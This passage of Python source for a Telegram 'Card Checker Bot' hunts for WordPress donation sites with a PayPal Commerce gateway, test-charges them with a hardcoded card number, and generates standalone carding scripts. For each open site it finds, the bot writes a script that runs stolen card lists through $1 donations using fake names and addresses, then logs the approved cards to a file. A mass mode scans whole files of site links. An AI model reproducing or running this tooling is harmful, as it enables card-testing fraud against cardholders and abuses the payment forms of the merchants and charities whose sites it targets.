    kb2 = types.InlineKeyboardMarkup()
    kb2.add(types.InlineKeyboardButton("Send another message", callback_data="yrr"))
    safe_send_message(user_id, "Your message has been sent.", reply_markup=kb2)
    waiting_users.pop(user_id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_"))
def start_reply(call):
    user_id = int(call.data.split("_")[1])
    reply_mode[call.from_user.id] = user_id
    safe_send_message(call.from_user.id, "Write your reply now:")

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
def send_reply(message):
    user_id = reply_mode[message.from_user.id]
    safe_send_message(user_id, f"Admin response:\n\n{message.text}")
    safe_send_message(OWNER_ID, "Reply sent.")
    reply_mode.pop(message.from_user.id)

@bot.callback_query_handler(func=lambda call: call.data == "start")
def back_to_start(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    username = call.from_user.username or "No Username"
    IU = f'''[⚡] 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 🌟\n[⚡] 𝐍𝐚𝐦𝐞: {userr}\n[⚡] 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}\n[⚡] 𝐈𝐃: <code>{user_id}</code>'''
    FRA = types.InlineKeyboardMarkup(row_width=2)
    Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
    FRA.add(Yes22)
    try:
        bot.edit_message_text(IU, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=FRA)
    except Exception as e:
        print(f"Back error: {e}")

# ═══════════════════════ أمر PayPal ═══════════════════════

@bot.message_handler(func=lambda m: m.text.lower().startswith('/paypal'))
def paypal_gateway(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        safe_send_message(message.chat.id, 'The admin has blocked you.')
        return

    ko = safe_send_message(message.chat.id, "- 🔍 Searching for gateway...")
    if not ko:
        return
    time.sleep(1)
    
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) != 2:
            safe_edit_message(message.chat.id, ko.message_id, '''- Please send the link like this:\n\n<code>/paypal https://xxxxxxx.xxx/xxxx</code>''')
            return

        link = parts[1].strip()

        if not link.startswith(("http://", "https://")):
            safe_edit_message(message.chat.id, ko.message_id, "Invalid link format ❌")
            return

        safe_edit_message(message.chat.id, ko.message_id, "✅ Gateway found! Testing...")

    except:
        pass

    try:
        paypal = PayPalCommerce(target_url=link)
        result = paypal.Charge('5143772354638703|05|28|886')
        
        live_indicators = [
            'INSUFFICIENT_FUNDS', 'TRANSACTION_REFUSED', 'CARD_DECLINED',
            'DO_NOT_HONOR', 'INSTRUMENT_DECLINED', 'EXPIRED_CARD',
            'INVALID_PAYMENT_METHOD', 'ACCOUNT_CLOSED', 'PAYER_CANNOT_PAY',
            'PAYMENT_DENIED', 'Payer cannot pay', 'ORDER_NOT_APPROVED',
            'INVALID_ACCOUNT', 'LOST_OR_STOLEN', 'CVV2_FAILURE',
            'SUSPECTED_FRAUD', 'GENERIC_DECLINE', 'TRANSACTION_NOT_PERMITTED',
        ]
        
        dead_indicators = [
            'invalid_client', 'Client Authentication failed', 'invalid_grant',
            'unsupported_grant_type', 'invalid_scope', 'Create Order Failed',
            'Invalid card format', 'No form fields', 'No au', 'No PayPal data',
            'Connection failed', 'Decode error', 'Invalid URL', 'Error:',
            'ImportError', 'Expecting value', 'INVALID_GATEWAY',
        ]
        
        is_live = False
        for indicator in live_indicators:
            if indicator.lower() in result.lower():
                is_live = True
                break
        
        is_dead = False
        for indicator in dead_indicators:
            if indicator.lower() in result.lower():
                is_dead = True
                break
        
        if is_dead or not is_live:
            safe_edit_message(message.chat.id, ko.message_id, f"❌ <b>Dead Gateway</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{link}</code>\n📝 <b>Response:</b> <code>{result}</code>")
            return

        file_name = f'gateway_{int(time.time())}.py'
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(f'''import requests, re, random, time, base64
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse

class PayPal:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
        self.donation = "1.00"
        self.id_form1 = "{paypal.form_data.get('give-form-id-prefix', '')}"
        self.id_form2 = "{paypal.form_data.get('give-form-id', '')}"
        self.nonec = "{paypal.form_data.get('give-form-hash', '')}"
        self.au = "{paypal.client_token or paypal.access_token or ''}"
        url = '{link}'
        parsed = urlparse(url)
        self.url = parsed.netloc
        self.inurl = parsed.path
        self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
        self.r = requests.Session()
        self.uu = UserAgent()
        self.checked = 0

    def Key(self):
        return self.au, self.id_form1, self.id_form2, self.nonec

    def Charge(self, ccx):
        self.checked += 1
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]
        
        da2 = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, self.donation),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
            'give_agree_to_terms': (None, '1'),
            'give_tos_agree': (None, '1'),
            'give_terms_agreement': (None, '1'),
            'consent': (None, '1'),
            'agree': (None, '1'),
            'accept': (None, '1'),
        }})
        he3 = {{'content-type': da2.content_type, 'user-agent': self.uu.random}}
        pa1 = {{'action': 'give_paypal_commerce_create_order'}}
        r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2).json()['data']['id']

        he4 = {{'authorization': f'Bearer {{self.au}}', 'paypal-client-metadata-id': self.paypal, 'user-agent': self.uu.random, 'x-paypal-consent': 'accepted', 'x-paypal-approval': 'approved'}}
        da3 = {{
            'payment_source': {{
                'card': {{
                    'number': n, 'expiry': f'20{{yy}}-{{mm}}', 'security_code': cvc,
                    'name': f'{{random.choice(self.first_name)}} {{random.choice(self.last_name)}}',
                    'billing_address': {{
                        'address_line_1': '123 Main Street',
                        'admin_area_1': 'NY',
                        'admin_area_2': 'New York City',
                        'postal_code': '10001',
                        'country_code': 'US'
                    }},
                    'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
                }},
            }},
            'application_context': {{
                'vault': False,
                'user_action': 'PAY_NOW',
                'shipping_preference': 'NO_SHIPPING',
            }},
        }}
        confirm_res = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source', headers=he4, json=da3)
        
        if confirm_res.status_code in [400, 422]:
            try:
                error_json = confirm_res.json()
                if 'details' in error_json and len(error_json['details']) > 0:
                    return error_json['details'][0].get('issue', 'DECLINED')
                if 'name' in error_json:
                    return error_json['name']
                if 'message' in error_json:
                    return error_json['message']
            except:
                pass
            return "DECLINED"

        da4 = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, self.donation),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
            'give_agree_to_terms': (None, '1'),
            'give_tos_agree': (None, '1'),
            'consent': (None, '1'),
            'agree': (None, '1'),
            'accept': (None, '1'),
        }})
        he5 = {{'content-type': da4.content_type, 'user-agent': self.uu.random}}
        pa2 = {{'action': 'give_paypal_commerce_approve_order', 'order': r3}}
        r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4)
        
        text = r5.text
        if text.strip().lower() == 'true':
            return 'CHARGE 1.00$'
        if 'true' in text.lower():
            return 'CHARGE 1.00$'
        if 'success' in text.lower():
            return 'CHARGE 1.00$'
        
        try:
            json_data = r5.json()
            if json_data.get('success') == True:
                return 'CHARGE 1.00$'
            if 'data' in json_data and isinstance(json_data['data'], dict):
                if 'error' in json_data['data']:
                    return str(json_data['data']['error'])
            if 'error' in json_data:
                return str(json_data['error'])
        except:
            pass
        
        if 'insufficient' in text.lower():
            return 'INSUFFICIENT_FUNDS'
        
        return "DECLINED"

if __name__ == '__main__':
    Getat = 'PayPal Custom 1$'
    print(f'Cheker {{Getat}}')
    Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
    if Br == '1':
        while True:
            ar = input('Enter Card ( n | mm | yy | cvc ): ')
            rr = PayPal()
            itt = rr.Key()
            resulti = rr.Charge(ar)
            if 'CHARGE' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                with open('Approved Card.txt', "a") as f:
                    f.write(ar + f': {{resulti}} > {{Getat}}\\n')
            print('Response: ' + resulti)
            time.sleep(5)
    else:
        noy = 0
        cr = input('Enter Name Combo: ')
        with open(cr, "r") as f:
            crads = f.read().splitlines()
            for P in crads:
                noy += 1
                try:
                    rr = PayPal()
                    itt = rr.Key()
                    resulti = rr.Charge(P)
                except Exception as e:
                    resulti = f'Error {{e}}'
                if 'CHARGE' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                    with open('Approved Card.txt', "a") as f:
                        f.write(P + ': {{resulti}} > {{Getat}}\\n')
                print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
                time.sleep(13)''')
        
        safe_send_document(message.chat.id, file_name, caption=f'''✅ <b>Live Gateway Found!</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{link}</code>\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Response:</b> <code>{result}</code>\n━━━━━━━━━━━━━━━━━━━━\nDev: @FAWZY30''')
        os.remove(file_name)

    except Exception as e:
        print(f"Error: {e}")

# ═══════════════════════ باقي الأوامر والتشغيل ═══════════════════════
# ═══════════════════════ أمر فك التشفير ═══════════════════════

@bot.message_handler(commands=['decode'])
def decode_token_command(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, "Admins only!")
        return
    
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) != 2:
            safe_send_message(message.chat.id, "Usage: /decode [token]")
            return
        
        token = parts[1].strip()
        decoder = TokenDecoder()
        
        results = []
        
        if '.' in token:
            jwt_result = decoder.decode_jwt_token(token)
            if jwt_result:
                results.append(f"📌 <b>JWT Payload:</b>\n<code>{json.dumps(jwt_result, indent=2)[:500]}</code>")
        
        try:
            b64_result = decoder.decode_base64_token(token)
            if b64_result:
                results.append(f"🔤 <b>Base64 Decoded:</b>\n<code>{str(b64_result)[:500]}</code>")
        except:
            pass
        
        if all(c in '0123456789abcdefABCDEF' for c in token):
            try:
                hex_result = bytes.fromhex(token).decode('utf-8', errors='ignore')
                results.append(f"🔢 <b>Hex Decoded:</b>\n<code>{hex_result[:500]}</code>")
            except:
                pass
        
        if not results:
            results.append("❌ Could not decode token")
        
        response = "🔐 <b>Token Decoding Results:</b>\n━━━━━━━━━━━━━━━━━━━━\n" + "\n\n".join(results)
        safe_send_message(message.chat.id, response)
        
    except Exception as e:
        safe_send_message(message.chat.id, f"❌ Error: {str(e)[:100]}")

# ═══════════════════════ أمر mass ═══════════════════════

@bot.message_handler(commands=['mass'])
def mass_extract_start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        safe_send_message(message.chat.id, 'The admin has blocked you.')
        return

    msg = safe_send_message(message.chat.id, "📁 Send a .txt file with links (one link per line):")
    if msg:
        bot.register_next_step_handler(msg, process_mass_file)

@bot.message_handler(commands=['stop'])
def stop_mass(message):
    user_id = message.from_user.id
    if user_id in processing_status:
        processing_status[user_id]['stop_flag'] = True
        safe_send_message(message.chat.id, "🛑 Stopping...")
    else:
        safe_send_message(message.chat.id, "❌ No active process.")

def check_single_link(link):
    try:
        if not link.startswith(("http://", "https://")):
            return {'link': link, 'live': False, 'respons': 'Invalid URL'}
        
        paypal = PayPalCommerce(target_url=link)
        result = paypal.Charge('5143772354638703|05|28|886')
        
        live_indicators = [
                'INSUFFICIENT_FUNDS', 'CARD_DECLINED', 'CARD_EXPIRED', 'EXPIRED_CARD',
    'INVALID_CARD', 'INVALID_CARD_NUMBER', 'INVALID_EXPIRY', 'INVALID_EXPIRY_DATE',
    'INVALID_CVC', 'INVALID_CVV', 'INVALID_CVV2', 'CVV_FAILURE', 'CVV2_FAILURE',
    'INVALID_SECURITY_CODE', 'SECURITY_CODE_FAILURE', 'INVALID_PIN',
    'CARD_NOT_SUPPORTED', 'CARD_TYPE_NOT_SUPPORTED', 'UNSUPPORTED_CARD',
    'CARD_NOT_ACTIVATED', 'CARD_NOT_ACTIVE', 'INACTIVE_CARD'
    'CARD_RESTRICTED', 'RESTRICTED_CARD', 'CARD_BLOCKED', 'BLOCKED_CARD',
    'CARD_LOST', 'LOST_CARD', 'CARD_STOLEN', 'STOLEN_CARD',
    'CARD_REPORTED_LOST', 'CARD_REPORTED_STOLEN',
    'CARD_ACCOUNT_CLOSED', 'ACCOUNT_CLOSED', 'CLOSED_ACCOUNT',
    'CARD_ACCOUNT_INVALID', 'INVALID_ACCOUNT', 'INVALID_CARD_ACCOUNT',
    'CARD_ACCOUNT_RESTRICTED', 'ACCOUNT_RESTRICTED', 'RESTRICTED_ACCOUNT',
    'CARD_ACCOUNT_BLOCKED', 'ACCOUNT_BLOCKED', 'BLOCKED_ACCOUNT',
    'CARD_ACCOUNT_FROZEN', 'ACCOUNT_FROZEN', 'FROZEN_ACCOUNT',
    'CARD_ACCOUNT_SUSPENDED', 'ACCOUNT_SUSPENDED', 'SUSPENDED_ACCOUNT',
    'DO_NOT_HONOR', 'DONT_HONOR', 'DONOT_HONOR', 'NOT_HONORED',
    'GENERIC_DECLINE', 'DECLINED', 'DECLINED_BY_BANK', 'BANK_DECLINED',
    'TRANSACTION_DECLINED', 'TRANSACTION_REFUSED', 'REFUSED',
    'TRANSACTION_NOT_PERMITTED', 'TRANSACTION_NOT_ALLOWED',
    'TRANSACTION_BLOCKED', 'TRANSACTION_BLOCKED_BY_BANK'
    'TRANSACTION_REJECTED', 'TRANSACTION_REJECTED_BY_BANK',
    'TRANSACTION_CANCELLED', 'TRANSACTION_CANCELED',
    'TRANSACTION_VOIDED', 'TRANSACTION_VOID',
    'TRANSACTION_EXPIRED', 'TRANSACTION_TIMEOUT',
    'TRANSACTION_LIMIT_EXCEEDED', 'LIMIT_EXCEEDED',
    'AMOUNT_LIMIT_EXCEEDED', 'DAILY_LIMIT_EXCEEDED', 'MONTHLY_LIMIT_EXCEEDED',
    'WITHDRAWAL_LIMIT_EXCEEDED', 'PURCHASE_LIMIT_EXCEEDED',
    'SUSPECTED_FRAUD', 'FRAUD_SUSPECTED', 'FRAUD_DETECTED',
    'POTENTIAL_FRAUD', 'FRAUD_ALERT', 'FRAUD_RISK',
    'SECURITY_VIOLATION', 'SECURITY_BREACH', 'SECURITY_ALERT',
    'SECURITY_BLOCK', 'SECURITY_BLOCKED', 'SECURITY_RESTRICTED',
    'RISK_REJECTED', 'RISK_BLOCKED', 'RISK_DECLINED',
    'SCA_REQUIRED', 'SCA_FAILED', 'SCA_REJECTED',
    '3DS_REQUIRED', '3DS_FAILED', '3DS_REJECTED',
    '3D_SECURE_REQUIRED', '3D_SECURE_FAILED', '3D_SECURE_REJECTED',
    'AUTHENTICATION_REQUIRED', 'AUTHENTICATION_FAILED', 'AUTHENTICATION_FAILURE',
    'AUTHENTICATION_REJECTED', 'AUTHENTICATION_DENIED',
    'VERIFICATION_REQUIRED', 'VERIFICATION_FAILED', 'VERIFICATION_REJECTED',
    'VALIDATION_REQUIRED', 'VALIDATION_FAILED', 'VALIDATION_ERROR',
    'PAYER_CANNOT_PAY', 'PAYER_ACTION_REQUIRED', 'PAYER_BLOCKED',
    'PAYER_ACCOUNT_RESTRICTED', 'PAYER_ACCOUNT_INVALID',
    'PAYER_ACCOUNT_LOCKED', 'PAYER_ACCOUNT_CLOSED',
    'PAYER_ACCOUNT_LOCKED_OR_CLOSED', 'PAYER_BLOCKED_TRANSACTION',
    'PAYEE_BLOCKED_TRANSACTION', 'PAYEE_ACCOUNT_RESTRICTED',
    'PAYEE_ACCOUNT_INVALID', 'PAYEE_ACCOUNT_LOCKED',
    'PAYEE_ACCOUNT_CLOSED', 'PAYEE_ACCOUNT_LOCKED_OR_CLOSED',
    'PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING',
    'MERCHANT_NOT_ENABLED', 'MERCHANT_ACCOUNT_RESTRICTED',
    'MERCHANT_ACCOUNT_INVALID', 'MERCHANT_ACCOUNT_CLOSED',
    'ORDER_NOT_APPROVED', 'ORDER_ALREADY_CAPTURED', 'ORDER_ALREADY_COMPLETED',
    'ORDER_ALREADY_VOIDED', 'ORDER_CANNOT_BE_CAPTURED', 'ORDER_CANNOT_BE_VOIDED',
    'ORDER_EXPIRED', 'ORDER_VOIDED', 'ORDER_CAPTURED', 'ORDER_COMPLETED',
    'ORDER_NOT_FOUND', 'ORDER_INVALID', 'ORDER_REJECTED',
    'ORDER_APPROVED', 'ORDER_APPROVAL_DENIED', 'ORDER_APPROVAL_REQUIRED',
    'ORDER_APPROVAL_PENDING', 'ORDER_APPROVAL_REJECTED',
    'PAYMENT_DENIED', 'PAYMENT_REJECTED', 'PAYMENT_REFUSED',
    'PAYMENT_CANCELLED', 'PAYMENT_CANCELED', 'PAYMENT_VOIDED',
    'PAYMENT_EXPIRED', 'PAYMENT_FAILED', 'PAYMENT_ERROR',
    'PAYMENT_NOT_APPROVED', 'PAYMENT_NOT_AUTHORIZED',
    'PAYMENT_AUTHORIZATION_FAILED', 'PAYMENT_AUTHORIZATION_DENIED',
    'PAYMENT_AUTHORIZATION_REJECTED', 'PAYMENT_AUTHORIZATION_EXPIRED',
    'PAYMENT_AUTHORIZATION_VOIDED', 'PAYMENT_AUTHORIZATION_CANCELLED',
    'PAYMENT_APPROVAL_REQUIRED', 'PAYMENT_APPROVAL_PENDING',
    'PAYMENT_APPROVAL_DENIED', 'PAYMENT_APPROVAL_REJECTED',
    'INVALID_CURRENCY', 'CURRENCY_NOT_SUPPORTED', 'UNSUPPORTED_CURRENCY',
    'INVALID_AMOUNT', 'AMOUNT_MISMATCH', 'AMOUNT_INVALID',
    'AMOUNT_EXCEEDED', 'AMOUNT_LIMIT', 'AMOUNT_TOO_HIGH', 'AMOUNT_TOO_LOW',
    'ITEM_TOTAL_MISMATCH', 'TAX_TOTAL_MISMATCH', 'SHIPPING_TOTAL_MISMATCH',
    'HANDLING_TOTAL_MISMATCH', 'INSURANCE_TOTAL_MISMATCH',
    'SHIPPING_DISCOUNT_MISMATCH', 'TOTAL_MISMATCH',
    'INVALID_PAYMENT_METHOD', 'INVALID_PAYMENT_METHOD_ID',
    'PAYMENT_METHOD_NOT_FOUND', 'PAYMENT_METHOD_EXPIRED',
    'PAYMENT_METHOD_INVALID', 'PAYMENT_METHOD_RESTRICTED',
    'PAYMENT_METHOD_BLOCKED', 'PAYMENT_METHOD_CLOSED',
    'PAYMENT_METHOD_NOT_SUPPORTED', 'PAYMENT_METHOD_UNSUPPORTED',
    'PAYMENT_METHOD_NOT_AVAILABLE', 'PAYMENT_METHOD_UNAVAILABLE',
    'INSTRUMENT_DECLINED', 'INSTRUMENT_NOT_FOUND', 'INSTRUMENT_INVALID',
    'INSTRUMENT_EXPIRED', 'INSTRUMENT_RESTRICTED', 'INSTRUMENT_BLOCKED',
    'ACCOUNT_NOT_FOUND', 'ACCOUNT_INVALID', 'ACCOUNT_CLOSED',
    'ACCOUNT_RESTRICTED', 'ACCOUNT_BLOCKED', 'ACCOUNT_SUSPENDED',
    'ACCOUNT_FROZEN', 'ACCOUNT_LOCKED', 'ACCOUNT_INACTIVE'
    'ACCOUNT_NOT_ACTIVE', 'ACCOUNT_NOT_ACTIVATED', 'ACCOUNT_EXPIRED',
    'ACCOUNT_VERIFICATION_REQUIRED', 'ACCOUNT_VERIFICATION_FAILED',
    'ACCOUNT_VERIFICATION_PENDING', 'ACCOUNT_LIMIT_EXCEEDED',
    'ACCOUNT_BLOCKED_BY_ISSUER', 'ACCOUNT_CLOSED_BY_ISSUER',
        ]
        
        dead_indicators = [
            'invalid_client', 'Client Authentication failed', 'invalid_grant',
            'unsupported_grant_type', 'invalid_scope', 'Create Order Failed',
            'Invalid card format', 'No form fields', 'No au', 'No PayPal data',
            'Connection failed', 'Decode error', 'Invalid URL', 'Error:',
            'ImportError', 'Expecting value', 'INVALID_GATEWAY',
        ]
        
        is_live = False
        for indicator in live_indicators:
            if indicator.lower() in result.lower():
                is_live = True
                break
        
        is_dead = False
        for indicator in dead_indicators:
            if indicator.lower() in result.lower():
                is_dead = True
                break
        
        if is_dead or not is_live:
            return {'link': link, 'live': False, 'respons': result}
        
        return {
            'link': link,
            'live': True,
            'respons': result,
            'id_form1': paypal.form_data.get('give-form-id-prefix', ''),
            'id_form2': paypal.form_data.get('give-form-id', ''),
            'nonec': paypal.form_data.get('give-form-hash', ''),
            'au': paypal.client_token or paypal.access_token or '',
        }
        
    except Exception as e:
        return {'link': link, 'live': False, 'respons': str(e)[:100]}

def process_mass_file(message):
    if not message.document:
        safe_send_message(message.chat.id, "❌ Please send a .txt file.")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        links = downloaded_file.decode('utf-8', errors='ignore').splitlines()
        links = [link.strip() for link in links if link.strip()]

        if not links:
            safe_send_message(message.chat.id, "❌ File is empty.")
            return

        total = len(links)
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        processing_status[user_id] = {
            'total': total, 'processed': 0, 'live': 0, 'dead': 0,
            'lock': threading.Lock(), 'current_url': '', 'current_respons': '',
            'stop_flag': False, 'done': False
        }
        
        status_msg = safe_send_message(chat_id, f"""📊 <b>File #1 - Scanning links...</b>\n━━━━━━━━━━━━━━━━━━\n📌 Total Links: {total}\n✅ Live: 0\n❌ Dead: 0\n⏳ Progress: 0% ░░░░░░░░░░░░░░░░░░░░\nUrl : ...\nRespons : ...\n━━━━━━━━━━━━━━━━━━\n⏱️ Checked 0 of {total}\n🛑 /stop to stop""")
        
        if not status_msg:
            return

        def update_status():
            last_text = ""
            while True:
                time.sleep(10)
                try:
                    with processing_status[user_id]['lock']:
                        if processing_status[user_id].get('done', False):
                            break
                        processed = processing_status[user_id]['processed']
                        live = processing_status[user_id]['live']
                        dead = processing_status[user_id]['dead']
                        current_url = processing_status[user_id]['current_url']
                        current_respons = processing_status[user_id]['current_respons']
                        percent = int((processed / total) * 100) if total > 0 else 0
                        bar_length = 20
                        filled = int((percent / 100) * bar_length)
                        bar = '█' * filled + '░' * (bar_length - filled)
                        text = f"""📊 <b>File #1 - Scanning links...</b>\n━━━━━━━━━━━━━━━━━━\n📌 Total Links: {total}\n✅ Live: {live}\n❌ Dead: {dead}\n⏳ Progress: {percent}% {bar}\nUrl : <code>{current_url[:60] if current_url else '...'}</code>\nRespons : <code>{current_respons[:60] if current_respons else '...'}</code>\n━━━━━━━━━━━━━━━━━━\n⏱️ Checked {processed} of {total}\n🛑 /stop to stop"""
                        
                        if text != last_text:
                            try:
                                bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
                                last_text = text
                            except:
                                pass
                except:
                    pass

        updater = threading.Thread(target=update_status, daemon=True)
        updater.start()

        time.sleep(2)

        for idx, link in enumerate(links):
            if processing_status[user_id].get('stop_flag', False):
                break
            
            with processing_status[user_id]['lock']:
                processing_status[user_id]['current_url'] = link
                processing_status[user_id]['current_respons'] = 'Checking...'
            
            result = check_single_link(link)
            
            with processing_status[user_id]['lock']:
                processing_status[user_id]['processed'] += 1
                if result and result.get('live'):
                    processing_status[user_id]['live'] += 1
                    live_idx = processing_status[user_id]['live']
                    processing_status[user_id]['current_respons'] = result['respons']
                    
                    try:
                        code = f'''import requests, re, random, time, base64
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse

class PayPal:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
        self.donation = "1.00"
        self.id_form1 = "{result['id_form1']}"
        self.id_form2 = "{result['id_form2']}"
        self.nonec = "{result['nonec']}"
        self.au = "{result['au']}"
        url = '{result['link']}'
        parsed = urlparse(url)
        self.url = parsed.netloc
        self.inurl = parsed.path
        self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
        self.r = requests.Session()
        self.uu = UserAgent()
        self.checked = 0

    def Key(self):
        return self.au, self.id_form1, self.id_form2, self.nonec

    def Charge(self, ccx):
        self.checked += 1
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]
        
        da2 = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, self.donation),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
            'give_agree_to_terms': (None, '1'),
            'give_tos_agree': (None, '1'),
            'give_terms_agreement': (None, '1'),
            'consent': (None, '1'),
            'agree': (None, '1'),
            'accept': (None, '1'),
        }})
        he3 = {{'content-type': da2.content_type, 'user-agent': self.uu.random}}
        pa1 = {{'action': 'give_paypal_commerce_create_order'}}
        r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2).json()['data']['id']

        he4 = {{'authorization': f'Bearer {{self.au}}', 'paypal-client-metadata-id': self.paypal, 'user-agent': self.uu.random, 'x-paypal-consent': 'accepted', 'x-paypal-approval': 'approved'}}
        da3 = {{
            'payment_source': {{
                'card': {{
                    'number': n, 'expiry': f'20{{yy}}-{{mm}}', 'security_code': cvc,
                    'name': f'{{random.choice(self.first_name)}} {{random.choice(self.last_name)}}',
                    'billing_address': {{
                        'address_line_1': '123 Main Street',
                        'admin_area_1': 'NY',
                        'admin_area_2': 'New York City',
                        'postal_code': '10001',
                        'country_code': 'US'
                    }},
                    'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
                }},
            }},
            'application_context': {{
                'vault': False,
                'user_action': 'PAY_NOW',
                'shipping_preference': 'NO_SHIPPING',
            }},
        }}
        confirm_res = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source', headers=he4, json=da3)
        
        if confirm_res.status_code in [400, 422]:
            try:
                error_json = confirm_res.json()
                if 'details' in error_json and len(error_json['details']) > 0:
                    return error_json['details'][0].get('issue', 'DECLINED')
                if 'name' in error_json:
                    return error_json['name']
                if 'message' in error_json:
                    return error_json['message']
            except:
                pass
            return "DECLINED"

        da4 = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, self.donation),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
            'give_agree_to_terms': (None, '1'),
            'give_tos_agree': (None, '1'),
            'consent': (None, '1'),
            'agree': (None, '1'),
            'accept': (None, '1'),
        }})
        he5 = {{'content-type': da4.content_type, 'user-agent': self.uu.random}}
        pa2 = {{'action': 'give_paypal_commerce_approve_order', 'order': r3}}
        r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4)
        
        text = r5.text
        if text.strip().lower() == 'true':
            return 'CHARGE 1.00$'
        if 'true' in text.lower():
            return 'CHARGE 1.00$'
        if 'success' in text.lower():
            return 'CHARGE 1.00$'
        
        try:
            json_data = r5.json()
            if json_data.get('success') == True:
                return 'CHARGE 1.00$'
            if 'data' in json_data and isinstance(json_data['data'], dict):
                if 'error' in json_data['data']:
                    return str(json_data['data']['error'])
            if 'error' in json_data:
                return str(json_data['error'])
        except:
            pass
        
        if 'insufficient' in text.lower():
            return 'INSUFFICIENT_FUNDS'
        
        return "DECLINED"

if __name__ == '__main__':
    Getat = 'PayPal Custom 1$'
    print(f'Cheker {{Getat}}')
    Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
    if Br == '1':
        while True:
            ar = input('Enter Card ( n | mm | yy | cvc ): ')
            rr = PayPal()
            itt = rr.Key()
            resulti = rr.Charge(ar)
            if 'CHARGE' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                with open('Approved Card.txt', "a") as f:
                    f.write(ar + f': {{resulti}} > {{Getat}}\\n')
            print('Response: ' + resulti)
            time.sleep(5)
    else:
        noy = 0
        cr = input('Enter Name Combo: ')
